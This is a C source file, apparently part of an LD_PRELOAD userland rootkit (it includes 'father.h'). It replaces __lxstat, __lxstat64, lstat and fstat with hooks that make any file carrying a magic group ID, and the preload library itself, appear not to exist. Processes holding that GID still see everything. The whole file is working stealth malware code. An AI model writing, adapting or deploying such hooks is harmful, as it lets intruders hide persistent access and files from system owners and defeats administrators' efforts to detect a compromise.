#include "father.h"

/*
  hook for __lxstat. Will be run by the rootkit internally to check file stats
*/
int __lxstat(int version, const char *path, struct stat *buf) {

	#ifdef DEBUG
	fprintf(stderr, "__lxstat() called!\n");
	#endif

	if(!o_lxstat) o_lxstat = dlsym(RTLD_NEXT, "__lxstat");

	if(getegid() == GID) return o_lxstat(version, path, buf);

	int result = o_lxstat(version, path, buf);

	if(buf->st_gid == GID || strstr(path, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}
	return result;
}

/*
 * __lxstat64() hook. Check for magic GID, and if set return an error.
*/
int __lxstat64(int version, const char *path, struct stat64 *buf) {

	#ifdef DEBUG
	fprintf(stderr, "__lxstat64() called!\n");
	#endif

	if(!o_lxstat64) o_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");

	if(getegid() == GID) return o_lxstat64(version, path, buf);

	int result = o_lxstat64(version, path, buf);

	if(buf->st_gid == GID || strstr(path, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}
	return result;
}

/*
 * lstat() hook. Check for magic GID, STRING, and PRELOAD location and if set return an error.
*/
int lstat(const char * path, struct stat * buf) {

	#ifdef DEBUG
	fprintf(stderr, "lstat() called!\n");
	#endif

	if(!o_lstat) o_lstat = dlsym(RTLD_NEXT, "lstat");

	if(getegid() == GID) return o_lstat(path, buf);

	int result = o_lstat(path, buf);

	if(buf->st_gid == GID || strstr(path, PRELOAD)) {
		errno = ENOENT;
		return -1;
	}

	return result;
}
/*
 * Check if fd has the magic GID, and if set return NOENT.
*/
int fstat(int filedes, struct stat *buf) {

	#ifdef DEBUG
	fprintf(stderr, "fstat() called!\n");
	#endif

	if(!o_fstat) o_fstat = dlsym(RTLD_NEXT, "fstat");

	if(getegid() == GID) return o_fstat(filedes, buf);

	int result = o_fstat(filedes, buf);

	if(buf->st_gid == GID) {
		errno = ENOENT;
		return -1;
	}

	return result;
}
